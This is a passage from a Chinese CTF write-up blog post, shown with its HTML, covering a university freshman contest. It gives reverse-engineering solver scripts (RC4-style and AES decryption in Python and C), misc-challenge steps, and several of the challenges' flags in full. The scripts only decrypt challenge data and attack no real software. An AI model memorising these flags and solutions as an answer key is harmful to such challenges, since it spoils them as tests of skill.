<span class="keyword">long</span>*)key);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="junk"><a href="#junk" class="headerlink" title="junk"></a>junk</h3><p>jmp selfaddr+1花指令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;so.in&#x27;</span>)</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    s = f.readline()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        a.append(int(s[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">key = <span class="string">&#x27;h4mbur93r&#x27;</span></span><br><span class="line">table1 = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">table2 = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    table1[i] = i</span><br><span class="line">    table2[i] = ord(key[i % <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    v9 = (table2[i] + v9 + table1[i]) % <span class="number">256</span></span><br><span class="line">    v2 = table1[v9]</span><br><span class="line">    table1[v9] = table1[i]</span><br><span class="line">    table1[i] = v2</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v10 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line">    v10 = (v10 + table1[v6]) % <span class="number">256</span></span><br><span class="line">    v4 = table1[v10]</span><br><span class="line">    table1[v10] = table1[v6]</span><br><span class="line">    table1[v6] = v4</span><br><span class="line">    flag += chr(a[i] ^ table1[(table1[v10] + table1[v6]) % <span class="number">256</span>])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="nodebugger"><a href="#nodebugger" class="headerlink" title="nodebugger"></a>nodebugger</h3><p>长度限制32，字符限制小写的十六进制</p>
<p>算法插件发现有AES加密和MD5哈希</p>
<p>MD5用于生成最后的比较数据，直接hook</p>
<p>AES密匙为unk_4568E0 </p>
<p>（在线工具属实坑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;openssl/aes.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char key[]=&#123;<span class="number">0xC5</span>,<span class="number">0x77</span>,<span class="number">0xBB</span>,<span class="number">0x0B</span>,<span class="number">0xCB</span>,<span class="number">0xAC</span>,<span class="number">0x58</span>,<span class="number">0x12</span>,<span class="number">0x39</span>,<span class="number">0xBB</span>,<span class="number">0xD5</span>,<span class="number">0x13</span>,<span class="number">0x24</span>,<span class="number">0x4D</span>,<span class="number">0xAA</span>,<span class="number">0x12</span>&#125;;</span><br><span class="line">	char <span class="keyword">in</span>[]=&#123;<span class="number">0x67</span>,<span class="number">0x76</span>,<span class="number">0x42</span>,<span class="number">0x90</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x76</span>,<span class="number">0x3b</span>,<span class="number">0x33</span>,<span class="number">0xb6</span>,<span class="number">0x08</span>,<span class="number">0x88</span>,<span class="number">0x2c</span>,<span class="number">0xdc</span>,<span class="number">0xc5</span>,<span class="number">0x4a</span>&#125;;</span><br><span class="line">	char out[<span class="number">16</span>];</span><br><span class="line">	AES_KEY aes;</span><br><span class="line">	AES_set_decrypt_key(key,<span class="number">128</span>,&amp;aes);</span><br><span class="line">	AES_decrypt(<span class="keyword">in</span>,out,&amp;aes);</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(<span class="string">&quot;%02x&quot;</span>,out[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>scuctf{d178350b4f101a795b7e04eaf5c2721b}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="esay-encode"><a href="#esay-encode" class="headerlink" title="esay_encode"></a>esay_encode</h3><p>三种字符猜测是摩斯电码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    s = f.readline()</span><br><span class="line">    s = s.replace(<span class="string">&#x27;401&#x27;</span>, <span class="string">&#x27;.&#x27;</span>)  <span class="comment"># long</span></span><br><span class="line">    s = s.replace(<span class="string">&#x27;SCU&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)  <span class="comment"># short</span></span><br><span class="line">    s = s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    s = s.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> s[:<span class="number">-1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>scuctf{R3@D_B3TW33N_TH3_L1N3S}</p>
<h3 id="奇怪的记录"><a href="#奇怪的记录" class="headerlink" title="奇怪的记录"></a>奇怪的记录</h3><p><a target="_blank" rel="noopener" href="https://tool.lu/dns/index.html">DNS查询</a></p>
<p> scuctf{72f216f4-1798-11eb-aa2a-54e1ad16c80b}</p>
<h3 id="excalibur"><a href="#excalibur" class="headerlink" title="excalibur"></a>excalibur</h3><p>修改后缀为zip</p>
<p>路径：excalibur\assets\excalibur\lang\en_us.json</p>
<p>scuctf{y0u_134rn_f0r93_v3ry_w311}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/16/SCU-2020-%E6%96%B0%E7%94%9F%E8%B5%9B/" data-id="cknk7fll1001r4sswgqpu9l90" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/re/" rel="tag">re</a></li></ul>

    </footer>
  </div>
  
  
<nav id="article-nav">
  
    <a href="/2021/01/14/BUU-go-get-the-flag/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">上一篇</strong>
      <div class="article-nav-title">
        
          BUU-go_get_the_flag
        
      </div>
    </a>
  
  
    <a href="/2020/12/11/%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">虚函数逆向分析</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">欢迎纱布们的到来</h1>
    <h2 class="blog-subtitle"></h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://i.loli.net/2020/09/25/QDZN6PSqghdjAUR.jpg">
    <h2 class="author">Papaya</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="" target="_blank" title="">
          
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="https://zhiaowei.github.io/" target="_blank" title="zhiaowei魏姐姐">
          zhiaowei魏姐姐
        </a>
      
        <a class="hvr-bounce-in" href="https://l0x1c.github.io/" target="_blank" title="l0x1c源哥">
          l0x1c源哥
        </a>
      
        <a class="hvr-bounce-in" href="https://www.izaiahsun.com/" target="_blank" title="Izaiahsun孙神">
          Izaiahsun孙神
        </a>
      
        <a class="hvr-bounce-in" href="https://panda0s.top/" target="_blank" title="panda0s无名师傅">
          panda0s无名师傅
        </a>
      
        <a class="hvr-bounce-in" href="darkeyer.github.io/" target="_blank" title="Darkeyer曦曦哥哥">
          Darkeyer曦曦哥哥
        </a>
      
        <a class="hvr-bounce-in" href="freek3r.github.io/" target="_blank" title="freek3r艾总">
          freek3r艾总
        </a>
      
        <a class="hvr-bounce-in" href="https://minhal.me/" target="_blank" title="Minhal学长">
          Minhal学长
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Papaya<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  
<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">

  
<script src="/plugin/galmenu/GalMenu.js"></script>

  <div class="GalMenu GalDropDown">
      <div class="circle" id="gal">
        <div class="ring">
          
            <a href="/" title="" class="menuItem">首页</a>
          
            <a href="/tags" title="" class="menuItem">标签</a>
          
            <a href="/categories" title="" class="menuItem">分类</a>
          
            <a href="/archives" title="" class="menuItem">归档</a>
          
            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
          
            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
          
        </div>
        
          <audio id="audio" src="#"></audio>
        
      </div> 
</div>
<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
    for (var i = 0,
    l = items.length; i < l; i++) {
      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
    }</script>
<script type="text/javascript">
  $(document).ready(function() {
    $('body').GalMenu({
      'menu': 'GalDropDown'
    })
  });
</script>

  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>